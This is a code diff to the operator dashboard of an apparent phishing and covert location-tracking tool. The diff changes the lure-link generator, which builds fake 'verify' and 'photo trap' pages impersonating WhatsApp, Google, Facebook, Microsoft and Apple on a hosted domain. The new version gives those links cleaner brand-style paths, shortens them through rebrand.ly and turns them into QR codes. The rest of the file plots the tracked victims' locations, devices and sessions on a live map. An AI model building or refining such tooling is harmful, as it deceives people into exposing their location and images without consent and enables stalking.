@@ -347,7 +347,7 @@
 
 <!-- ===== LINK GENERATOR PANEL ===== -->
 <div id="linkPanel">
-    <!-- Verification Link -->
+    <!-- Verification Link (Clean URL: /{brand}/verify) -->
     <div class="section">
         <label>📤 Verify</label>
         <select id="brandSelect">
@@ -357,14 +357,14 @@
             <option value="microsoft">⬡ Microsoft</option>
             <option value="apple"> Apple</option>
         </select>
-        <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
-        <button class="btn" id="copyLinkBtn">📋 Copy</button>
+        <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/whatsapp/verify</span>
         <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
+        <button class="btn" id="copyLinkBtn">📋 Copy Short</button>
     </div>
 
     <div class="divider"></div>
 
-    <!-- Photo Trap Link -->
+    <!-- Photo Trap Link (Clean URL: /{brand}/photo) -->
     <div class="section">
         <label>📸 Photo</label>
         <select id="photoTemplateSelect">
@@ -374,8 +374,9 @@
             <option value="microsoft">⬡ Microsoft</option>
             <option value="apple"> Apple</option>
         </select>
-        <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
-        <button class="btn" id="copyPhotoLinkBtn">📋 Copy</button>
+        <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/whatsapp/photo</span>
+        <span class="short-link" id="photoShortLink">rebrand.ly/view-photo-wa</span>
+        <button class="btn" id="copyPhotoLinkBtn">📋 Copy Short</button>
     </div>
 
     <div class="divider"></div>
@@ -436,12 +437,20 @@
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
 
+    // 🆕 REBRANDLY SHORT LINKS (Replace with YOUR actual Rebrandly links)
     const SHORT_LINKS = {
         google: 'rebrand.ly/verify-google',
         whatsapp: 'rebrand.ly/verify-wa',
         facebook: 'rebrand.ly/verify-FACEBOOK',
         microsoft: 'rebrand.ly/verify-ms',
-        apple: 'rebrand.ly/apple-security'
+        apple: 'rebrand.ly/apple-security',
+        
+        // Photo trap short links
+        photo_google: 'rebrand.ly/view-photo-google',
+        photo_whatsapp: 'rebrand.ly/view-photo-wa',   // <-- CHANGE to your actual link
+        photo_facebook: 'rebrand.ly/view-photo-fb',
+        photo_microsoft: 'rebrand.ly/view-photo-ms',
+        photo_apple: 'rebrand.ly/view-photo-apple'
     };
 
     // =============================================
@@ -454,6 +463,7 @@
     const shortLinkDisplay = document.getElementById('shortLinkDisplay');
     const copyLinkBtn = document.getElementById('copyLinkBtn');
     const photoLinkDisplay = document.getElementById('photoLinkDisplay');
+    const photoShortLink = document.getElementById('photoShortLink');
     const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
     const generateQrBtn = document.getElementById('generateQrBtn');
     const qrPopup = document.getElementById('qrPopup');
@@ -462,11 +472,11 @@
     const closeQrBtn = document.getElementById('closeQrBtn');
 
     // =============================================
-    // UPDATE VERIFICATION LINK
+    // UPDATE VERIFICATION LINK (Clean URL: /{brand}/verify)
     // =============================================
     function updateLink() {
         const brand = brandSelect.value;
-        const fullUrl = BASE_URL + '/?template=' + brand;
+        const fullUrl = BASE_URL + '/' + brand + '/verify';
         const shortUrl = SHORT_LINKS[brand] || '';
         linkDisplay.textContent = fullUrl;
         shortLinkDisplay.textContent = shortUrl;
@@ -475,19 +485,20 @@
     updateLink();
 
     // =============================================
-    // COPY VERIFICATION LINK
+    // COPY VERIFICATION SHORT LINK
     // =============================================
     copyLinkBtn.addEventListener('click', function() {
-        const link = linkDisplay.textContent;
-        navigator.clipboard.writeText(link).then(() => {
+        const shortUrl = shortLinkDisplay.textContent;
+        navigator.clipboard.writeText(shortUrl).then(() => {
             const originalText = copyLinkBtn.textContent;
             copyLinkBtn.textContent = '✅ Copied!';
             setTimeout(() => {
                 copyLinkBtn.textContent = originalText;
             }, 2000);
         }).catch(() => {
+            // Fallback
             const range = document.createRange();
-            range.selectNode(linkDisplay);
+            range.selectNode(shortLinkDisplay);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
@@ -500,22 +511,24 @@
     });
 
     // =============================================
-    // UPDATE PHOTO TRAP LINK
+    // UPDATE PHOTO TRAP LINK (Clean URL: /{brand}/photo)
     // =============================================
     function updatePhotoLink() {
         const template = photoTemplateSelect.value;
-        const url = BASE_URL + '/photo?template=' + template;
-        photoLinkDisplay.textContent = url;
+        const fullUrl = BASE_URL + '/' + template + '/photo';
+        const shortUrl = SHORT_LINKS['photo_' + template] || '';
+        photoLinkDisplay.textContent = fullUrl;
+        photoShortLink.textContent = shortUrl;
     }
     photoTemplateSelect.addEventListener('change', updatePhotoLink);
     updatePhotoLink();
 
     // =============================================
-    // COPY PHOTO TRAP LINK
+    // COPY PHOTO TRAP SHORT LINK
     // =============================================
     copyPhotoLinkBtn.addEventListener('click', function() {
-        const link = photoLinkDisplay.textContent;
-        navigator.clipboard.writeText(link).then(() => {
+        const shortUrl = photoShortLink.textContent;
+        navigator.clipboard.writeText(shortUrl).then(() => {
             const originalText = copyPhotoLinkBtn.textContent;
             copyPhotoLinkBtn.textContent = '✅ Copied!';
             setTimeout(() => {
@@ -523,7 +536,7 @@
             }, 2000);
         }).catch(() => {
             const range = document.createRange();
-            range.selectNode(photoLinkDisplay);
+            range.selectNode(photoShortLink);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
@@ -536,11 +549,11 @@
     });
 
     // =============================================
-    // QR CODE GENERATOR
+    // QR CODE GENERATOR (Uses clean URL)
     // =============================================
     generateQrBtn.addEventListener('click', function() {
         const template = qrTemplateSelect.value;
-        const url = BASE_URL + '/?template=' + template;
+        const url = BASE_URL + '/' + template + '/verify'; // or /photo
         const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
         qrCodeImg.src = qrApiUrl;
         qrPopup.style.display = 'flex';
@@ -569,7 +582,7 @@
     });
 
     // =============================================
-    // MAP SETUP
+    // MAP SETUP (unchanged)
     // =============================================
     const map = L.map('map', { zoomControl: false }).setView([51.505, -0.09], 13);
     L.control.zoom({ position: 'topright' }).addTo(map);
@@ -584,7 +597,7 @@
     function getColor() { return colorPalette[colorIndex++ % colorPalette.length]; }
 
     // =============================================
-    // DEVICE DETECTION
+    // DEVICE DETECTION (unchanged)
     // =============================================
     function getDeviceModel(userAgent) {
         if (!userAgent) return 'Unknown Device';
@@ -701,7 +714,7 @@
     }
 
     // =============================================
-    // RENDER USER LIST
+    // RENDER USERS (unchanged)
     // =============================================
     function renderUsers(users) {
         const list = document.getElementById('userList');
@@ -747,7 +760,7 @@
     }
 
     // =============================================
-    // FOCUS USER
+    // FOCUS USER (unchanged)
     // =============================================
     function focusUser(sessionId) {
         if (markers[sessionId] && markers[sessionId].lat && markers[sessionId].lng) {
@@ -764,7 +777,7 @@
     }
 
     // =============================================
-    // FETCH USERS
+    // FETCH USERS (unchanged)
     // =============================================
     function fetchUsers() {
         fetch(RENDER_URL + '/get-users')
@@ -784,7 +797,7 @@
     }
 
     // =============================================
-    // UPDATE MARKERS
+    // UPDATE MARKERS (unchanged)
     // =============================================
     function updateMarkers(users) {
         const activeSessions = new Set();
@@ -879,7 +892,7 @@
     }
 
     // =============================================
-    // UPDATE STATS
+    // UPDATE STATS (unchanged)
     // =============================================
     function updateStats(users) {
         const live = users.filter(u => u.lat && u.lng).length;
@@ -903,9 +916,9 @@
     window.addEventListener('resize', () => setTimeout(() => map.invalidateSize(), 200));
     setTimeout(() => map.invalidateSize(), 500);
 
-    console.log('📍 Dashboard initialized');
-    console.log('🔗 Links available in the panel above');
-    console.log('📱 QR code generator ready');
+    console.log('📍 Dashboard initialized with CLEAN URLs (no ?template=)');
+    console.log('🔗 Verification: ' + BASE_URL + '/whatsapp/verify');
+    console.log('📸 Photo Trap: ' + BASE_URL + '/whatsapp/photo');
 </script>
 </body>
 </html>
